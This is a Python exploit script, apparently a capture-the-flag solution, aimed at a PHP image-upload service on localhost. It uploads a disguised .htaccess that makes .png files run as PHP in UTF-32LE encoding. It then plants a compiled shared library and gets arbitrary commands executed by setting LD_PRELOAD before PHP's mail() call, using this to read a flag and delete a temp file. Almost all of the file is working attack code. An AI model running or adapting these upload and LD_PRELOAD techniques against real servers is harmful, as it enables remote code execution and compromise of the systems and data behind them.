import requests
import base64
import os
# yes this is ugly as fuck :>

HOST = "localhost"
url = "http://{}:80/".format(HOST)
cookies = {"PHPSESSID": "lqo3u8t6tlbkv1vqrcq65ugr54"}
headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "http://localhost/", "Content-Type": "multipart/form-data; boundary=---------------------------187509938715180228931097466761", "Connection": "close", "Upgrade-Insecure-Requests": "1"}

userdir = requests.get(url, cookies=cookies).content.split("images/")[1].split("/")[0]
print("userdir: {}".format(userdir))

def htaccess():
    data="-----------------------------187509938715180228931097466761\r\nContent-Disposition: form-data; name=\"image\"; filename=\"..htaccess\"\r\nContent-Type: application/x-desktop\r\n\r\n\x00\x00\x8a\x39\x8a\x39AAAAAAAAAA\nAddHandler application/x-httpd-php .png\nphp_flag zend.multibyte 1\nphp_value zend.script_encoding 'UTF-32LE'\nphp_flag zend.detect_unicode 0\nphp_value auto_append_file 'php://filter/convert.iconv.UTF-8%2fUTF-32LE/resource=/tmp/IAM_THE_BESTEST_HACKZ0R'\r\n-----------------------------187509938715180228931097466761\r\nContent-Disposition: form-data; name=\"upload\"\r\n\r\nSubmit Query\r\n-----------------------------187509938715180228931097466761--\r\n"
    requests.post(url, headers=headers, cookies=cookies, data=data).content 

def upload_so():
    os.system("gcc -shared -o libpwn.so pwn.c")
    libso = base64.b64encode(open("libpwn.so").read())
    payload = "<?php error_log(base64_decode('{}'), 3, 'libpwn.so');".format(libso).encode("utf-32le")
    data="-----------------------------187509938715180228931097466761\r\nContent-Disposition: form-data; name=\"image\"; filename=\"foo.png\"\r\nContent-Type: application/x-desktop\r\n\r\n\x00\x00\x8a\x39\x8a\x39AAAAAAAAAA{}\r\n-----------------------------187509938715180228931097466761\r\nContent-Disposition: form-data; name=\"upload\"\r\n\r\nSubmit Query\r\n-----------------------------187509938715180228931097466761--\r\n".format(payload)
    requests.post(url, headers=headers, cookies=cookies, data=data).content 
    requests.get(url + "/images/{}/foo.png".format(userdir))

def mail_exec(cmd): 
    payload = "<?php putenv(\"LD_PRELOAD=./libpwn.so\");putenv(\"pwn={}\");mail(\"foo\",\"bar\",\"baz\",\"\");".format(cmd).encode("utf-32le")
    data="-----------------------------187509938715180228931097466761\r\nContent-Disposition: form-data; name=\"image\"; filename=\"foo.png\"\r\nContent-Type: application/x-desktop\r\n\r\n\x00\x00\x8a\x39\x8a\x39AAAAAAAAAA{}\r\n-----------------------------187509938715180228931097466761\r\nContent-Disposition: form-data; name=\"upload\"\r\n\r\nSubmit Query\r\n-----------------------------187509938715180228931097466761--\r\n".format(payload)
    requests.post(url, headers=headers, cookies=cookies, data=data) 
    print(requests.get(url + "/images/{}/foo.png".format(userdir)).content)

htaccess()
upload_so()
mail_exec("cd /; bash -c 'expr $(grep + /tmp/IAM_THE_BESTEST_HACKZ0R)' | /get_flag > /tmp/IAM_THE_BESTEST_HACKZ0R; cat /tmp/IAM_THE_BESTEST_HACKZ0R")
mail_exec("rm /tmp/IAM_THE_BESTEST_HACKZ0R")
